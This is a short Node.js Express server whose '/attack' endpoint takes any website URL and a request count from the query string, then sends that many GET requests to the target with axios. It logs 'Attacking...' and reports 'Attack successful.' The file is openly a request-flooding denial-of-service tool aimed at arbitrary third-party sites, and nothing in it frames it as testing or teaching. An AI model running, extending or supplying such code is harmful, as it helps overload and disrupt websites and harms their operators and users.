/*
* dev: Sazumi Viki
* ig: @moe.sazumiviki
* gh: github.com/sazumivicky
* site: sazumi.moe
*/

const express = require('express');
const axios = require('axios');
const app = express();
const PORT = 3000;

app.use(express.static('public'));

app.get('/attack', (req, res) => {
  const { website, count } = req.query;
  
  if (!website || !count) {
    return res.status(400).json({ message: "Website URL and count are required." });
  }
  
  const url = website;
  const requestCount = parseInt(count);

  if (isNaN(requestCount) || requestCount <= 0) {
    return res.status(400).json({ message: "Invalid request count." });
  }

  const attack = async () => {
    try {
      console.log(`Attacking ${url} ${requestCount} times...`);
      for (let i = 0; i < requestCount; i++) {
        await axios.get(url);
      }
      console.log(`Attack on ${url} completed successfully.`); 
      res.json({ message: "Attack successful." });
    } catch (error) {
      console.error('Error:', error);
      res.status(500).json({ message: "Internal server error." });
    }
  };
  
  attack();
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
